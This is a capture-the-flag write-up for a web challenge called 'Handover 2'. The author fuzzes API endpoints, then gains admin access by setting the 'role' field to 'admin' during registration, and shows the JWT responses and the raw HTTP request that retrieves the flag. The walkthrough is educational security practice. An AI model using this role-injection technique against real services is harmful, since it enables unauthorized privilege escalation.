#### Handover 2 
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e89a29d8-47c0-478c-9d00-4d85cbf0c7d2)

Going over to the url shows this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/70154cbc-d2bf-4099-bc20-b76d8a6c391e)

I then decided to fuzz for endpoints using feroxbuster and got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a414916b-9db4-4638-9d9a-0f99ec945340)

We have three endpoints

```
/api/register
/api/login
/api/flag
```

When I tried accessing `/api/flag` I got this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/10a38899-ea71-4a1a-a12f-a2e13cad5cf6)

To register I first accessed `/api/register` as a `GET` request
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/fe3854fa-d7b2-4351-8d74-c529492fc9e6)

So that's the parameter required to register

I used burp to do this

Let us register a user
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/94e202e0-7178-4ff3-a04c-372f0e49da8f)

We can now login
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a8e0e5de-38fe-481c-8857-274a77651f68)

```json
{
"email":"root@root.com",
"firstName":"pwner",
"lastName":"haxor",
"role":"user",
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJvb3RAcm9vdC5jb20iLCJpYXQiOjE2ODkxNzY2MzksImV4cCI6MTY4OTE4MDIzOX0.3TPesuZVJ6A5uP4MgGeVzLaVK7wdgIc_RLXa48XWke0"
}
```

Looking at the json response formed we see that role is set to `user` 

We can try to register a user again and set role to `admin`
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/dc29ce8a-ae76-4017-b7c2-552202c821aa)

When I logged in it showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/0f7ac8b9-020e-4d03-a6b7-24d1f33f3c4b)

```json
{
"email":"root@root.io",
"firstName":"pwned",
"lastName":"pwned",
"role":"admin",
"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJvb3RAcm9vdC5pbyIsImlhdCI6MTY4OTE3Njc3MSwiZXhwIjoxNjg5MTgwMzcxfQ.kDURYuKEuIR1NF2ht-F2R1Zv9sGE5_PLTJjnWv3zNdo"
}
```

It worked and this confirmed a broken access control vulnerability

I can now get the flag using the json web token
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/09494277-3424-406c-a1d5-fd3792fa2468)

```r
GET /api/flag HTTP/1.1
Host: 143.198.98.92:9092
User-Agent: python-requests/2.25.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJvb3RAcm9vdC5pbyIsImlhdCI6MTY4OTE3Njc3MSwiZXhwIjoxNjg5MTgwMzcxfQ.kDURYuKEuIR1NF2ht-F2R1Zv9sGE5_PLTJjnWv3zNdo


```

And I got the flag

```
Flag: csean-ctf{Joan!I_told_you_not_TO_trust_us3r_inputs_buh_YOU_NEVER_LISTEN!}
```
